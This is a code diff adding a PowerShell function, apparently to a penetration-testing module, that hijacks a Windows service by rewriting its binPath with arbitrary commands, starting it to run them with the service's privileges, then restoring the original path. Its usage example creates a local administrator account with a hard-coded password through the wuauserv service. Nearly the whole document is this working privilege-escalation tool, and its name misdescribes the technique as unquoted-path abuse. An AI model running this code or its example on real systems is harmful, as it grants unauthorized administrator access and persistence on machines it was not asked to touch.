@@ -2027,3 +2027,170 @@ END
 }  # End END
 
 }  # End Function Invoke-UseCreds
+
+<#
+.NAME
+    Invoke-UnquotedServicePathExploit
+
+
+.SYNOPSIS
+    Abuses an unquoted service path in the Windows registry to execute commands using the
+    permissions of the user that starts the service.
+
+
+.DESCRIPTION
+    Uses the Name property of a service. The service is modified to contain a command in the
+    binPath value. The service is then started to execute the defined command.
+
+
+.PARAMETER
+    -Name <String[]>
+        Specifies the service names of services to be exploited. Service Name value is
+        accepted from the pipeline.
+
+        Required?                    true
+        Position?                    0
+        Default value                None
+        Accept pipeline input?       True (ByPropertyName, ByValue)
+        Accept wildcard characters?  false
+
+    -Command
+        Custom command to execute instead of user creation.
+
+        Required?                    true
+        Position?                    1
+        Default value                None
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+
+.EXAMPLE
+    -------------------------- EXAMPLE 1 --------------------------
+    PS C:\> Invoke-UnquotedServicePathExploit -Name wuauserv -Command "net user tobor Passw0rd1! /add", "net localgroup Administrators tobor /add"
+    This example exploits 'wuauserv' to add a localuser "tobor" with password Passw0rd1! to the local administrator group
+
+
+.NOTES
+    Author: Robert H. Osborne
+    Alias: tobor
+    Contact: rosborne@osbornepro.com
+
+.LINK
+    https://github.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://roberthosborne.com
+
+
+.INPUTS
+    System.ServiceProcess.ServiceController, System.String
+        You can pipe a service object or a service name to this cmdlet.
+
+
+.OUTPUTS
+    PSObject
+        Returns a custom PSObject consisting of the parameter values entered
+
+#>
+Function Invoke-UnquotedServicePathExploit {
+    [CmdletBinding()]
+        param (
+            [Parameter(
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage="Define the name of the possibly vulnerable service.")]  # End Parameter
+            [ValidateNotNullOrEmpty()]
+            [Alias('ServiceName')]
+            [String[]]$Name,
+
+            [Parameter(
+                Mandatory=$True,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage="Enter a command or commands you want executed")]  # End Parameter
+            [ValidateNotNullOrEmpty()]
+            [String]$Command)  # End param
+
+BEGIN
+{
+
+    If ($PSBoundParameters['Command'])
+    {
+
+        $Commands = @($Command)
+
+    }  # End If
+
+}  # End BEGIN
+PROCESS
+{
+
+    ForEach ($ServiceName in $Name)
+    {
+
+        Write-Verbose "[*] Obtaining object info for $ServiceName"
+        $ServiceObj = Get-Service -Name $ServiceName
+
+        Try
+        {
+
+            $ServiceDetails = Get-CimInstance -Class "Win32_Service" -Filter "Name='$ServiceName'"
+
+        }  # End Try
+        Catch
+        {
+
+            Write-Verbose "[!] Get-CimInstance is not available on device. Using Get-WmiObject"
+            $ServiceDetails = Get-WmiObject -Class "Win32_Service" -Filter "Name='$ServiceName'"
+
+        }  # End Catch
+
+        $OriginalServicePath = $ServiceDetails.PathName
+        Write-Verbose "[*] Original Service Path Value     : '$OriginalServicePath'"
+
+        $OriginalServiceState = $ServiceDetails.State
+        Write-Verbose "[*] Original State for $ServiceName : '$OriginalServiceState'"
+
+        If ($ServiceDetails.StartMode -eq 'Disabled')
+        {
+
+            Write-Verbose "[*] $ServiceName is disabled. Changing service startup type to Manual"
+            $ServiceObj | Set-Service -StartupType "Manual" -ErrorAction Stop
+
+        }  # End If
+
+        ForEach($ServiceCommand in $Commands)
+        {
+
+            Write-Verbose "[*] Modifying service binPath value to: $ServiceCommand"
+            cmd /c sc config $ServiceName binPath="$ServiceCommand"
+
+            Write-Verbose "[*] Starting $ServiceName to execute '$ServiceCommand'"
+            Start-Service -Name $ServiceName -ErrorAction SilentlyContinue -Force
+
+            Write-Verbose "[*] Running 2 second buffer between commands"
+            Start-Sleep -Seconds 2
+
+        }  # End ForEach
+
+        Write-Verbose "[*] Stopping modified service"
+        Stop-Service -Name $ServiceName -Force -ErrorAction Stop -Force
+
+        Write-Verbose "[*] Restoring original path value for $ServiceName"
+        Start-Sleep -Seconds 1
+
+        cmd /c sc config $ServiceName binPath="$OriginalServicePath"
+        $ServiceObj | Set-Service -StartupType "$OriginalServiceState" -ErrorAction Stop
+
+        $Obj = New-Object -TypeName "PSObject" -Property @{
+            ServiceAbused = $ServiceObj.Name
+            Command = ($Commands -join ' && ')
+        }  # End Property
+        $Obj
+
+    }  # End ForEach
+
+}  # End PROCESS
+
+}  # End Function Invoke-UnquotedServicePathExploit
